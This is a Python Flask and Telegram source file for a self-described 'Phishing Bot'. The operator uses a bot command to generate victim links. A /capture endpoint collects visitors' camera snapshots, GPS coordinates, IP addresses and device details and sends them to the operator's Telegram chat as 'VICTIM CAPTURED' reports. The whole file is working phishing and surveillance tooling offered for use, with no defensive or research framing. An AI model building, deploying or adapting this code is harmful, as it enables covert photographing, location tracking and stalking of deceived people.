import uuid
import requests
from flask import Flask, request, render_template
from datetime import datetime
import base64
import os
import threading
import logging
import re
import asyncio

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "YOUR_TELEGRAM_USER_ID")
RENDER_BASE_URL = os.getenv("RENDER_URL", "http://localhost:5000")

app = Flask(__name__)

def send_telegram(text, chat_id=ADMIN_CHAT_ID):
    """Helper to send text message to your Telegram"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.warning("BOT_TOKEN not set. Skipping Telegram send.")
        logger.info(f"Message would have been: {text}")
        return

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code != 200:
            logger.error(f"Telegram API error: {response.text}")
    except Exception as e:
        logger.error(f"Telegram send error: {e}")

def send_telegram_photo(image_path, caption="", chat_id=ADMIN_CHAT_ID):
    """Helper to send an image file to your Telegram"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not os.path.exists(image_path):
        logger.warning(f"Photo send skipped. Token set: {BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE'}, File exists: {os.path.exists(image_path)}")
        return

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    
    # Read the file in binary mode
    with open(image_path, 'rb') as photo:
        files = {'photo': photo}
        data = {
            "chat_id": chat_id,
            "caption": caption,
            "parse_mode": "HTML"
        }
        try:
            response = requests.post(url, files=files, data=data, timeout=30)
            if response.status_code != 200:
                logger.error(f"Telegram Photo API error: {response.text}")
        except Exception as e:
            logger.error(f"Telegram photo send error: {e}")

# --- TELEGRAM BOT HANDLERS ---
def bot_listener():
    """Runs the Telegram bot in a background thread with its own event loop."""
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler
    except ImportError as e:
        logger.critical(f"Failed to import telegram: {e}")
        return

    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.warning("BOT_TOKEN is default. Bot listener not starting.")
        return

    # Create a new event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def run_bot():
        application = Application.builder().token(BOT_TOKEN).build()

        def start(update, context):
            user = update.effective_user
            if str(user.id) != str(ADMIN_CHAT_ID):
                return
            send_telegram(f"✅ <b>Phishing Bot Active</b>\n\nType <code>/link</code> to generate a new victim link.", user.id)

        def generate_link(update, context):
            user = update.effective_user
            if str(user.id) != str(ADMIN_CHAT_ID):
                return
            
            unique_id = str(uuid.uuid4())[:8]
            link = f"{RENDER_BASE_URL}/phish/{unique_id}"
            
            msg = f"""🔗 <b>New Phishing Link</b>

<b>Link:</b>
{link}

<b>ID:</b> <code>{unique_id}</code>
<b>Status:</b> Waiting for victim..."""
            send_telegram(msg, user.id)

        def help_command(update, context):
            send_telegram("Commands:\n/link - Generate new link\n/help - Show help", update.effective_user.id)

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("link", generate_link))
        application.add_handler(CommandHandler("help", help_command))

        logger.info("🤖 Bot listener started (Async Mode).")
        await application.initialize()
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        
        # Keep the bot running indefinitely
        while True:
            await asyncio.sleep(1)

    try:
        loop.run_until_complete(run_bot())
    except Exception as e:
        logger.critical(f"Bot listener crashed: {e}", exc_info=True)
    finally:
        loop.close()

# Start Bot Listener in a background thread
bot_thread = threading.Thread(target=bot_listener, daemon=True)
bot_thread.start()

# --- PHISHING ENDPOINTS ---

@app.route('/')
def index():
    status = "Configured" if 'BOT_TOKEN' in os.environ else "Default"
    return f"""
    <h1>🕸️ Phishing Bot Server</h1>
    <p>Status: <b>Active</b></p>
    <p>Bot Token: <code>{status}</code></p>
    <p>Admin Chat ID: <code>{ADMIN_CHAT_ID}</code></p>
    <p>Public URL: <code>{request.host_url}</code></p>
    <p>Use <code>/link</code> in your bot to generate a phishing link.</p>
    """

@app.route('/phish/<unique_id>')
def phish_page(unique_id):
    logger.info(f"👀 Victim visited page. ID: {unique_id} | IP: {request.remote_addr}")
    return render_template('phish.html', unique_id=unique_id)

@app.route('/capture', methods=['POST'])
def capture_data():
    data = request.json
    unique_id = data.get('unique_id', 'unknown')
    victim_ip = request.remote_addr
    
    snapshot_path = None
    if data.get('cameraSnapshot'):
        base64_data = data['cameraSnapshot'].split(',')[1]
        filename = f"captures/{unique_id}_{datetime.now().strftime('%H%M%S')}.jpg"
        os.makedirs("captures", exist_ok=True)
        try:
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(base64_data))
            snapshot_path = filename
            logger.info(f"Snapshot saved to {filename}")
        except Exception as e:
            logger.error(f"Error saving snapshot: {e}")

    safe_ua = re.sub(r'<[^>]+>', '', str(data.get('userAgent', 'N/A')))[:60]

    # Prepare Caption for the Photo
    caption = f"""🚨 <b>VICTIM CAPTURED</b> 🚨
🆔 <b>ID:</b> <code>{unique_id}</code>

📍 <b>LOCATION</b>
🏙️ City: {data.get('city', 'N/A')}
🗺️ Region: {data.get('region', 'N/A')}
🌍 Country: {data.get('country', 'N/A')}
📌 Coords: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}

🌐 <b>NETWORK</b>
🔢 Client IP: {data.get('ip', 'N/A')}
🔢 Server IP: {victim_ip}
💻 UA: {safe_ua}...
🖥️ Screen: {data.get('screenRes', 'N/A')}

🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}"""

    # Send the photo if we have one
    if snapshot_path:
        send_telegram_photo(snapshot_path, caption=caption)
    else:
        # Fallback to text if no camera data
        fallback_report = f"""
🚨 <b>VICTIM CAPTURED (NO CAMERA)</b> 🚨
{caption}
📸 <b>CAMERA</b>
❌ No camera data provided.
"""
        send_telegram(fallback_report)

    # Cleanup: Optional. Remove old files to save disk space on Render
    # Render filesystem is ephemeral, but let's keep it clean just in case
    # (Render resets on deploy anyway, so this is optional)
    
    return {"status": "success", "msg": "Verification complete."}

@app.route('/health')
def health():
    return "OK"

if __name__ == '__main__':
    # Render injects the PORT environment variable
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"🚀 Starting Flask server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
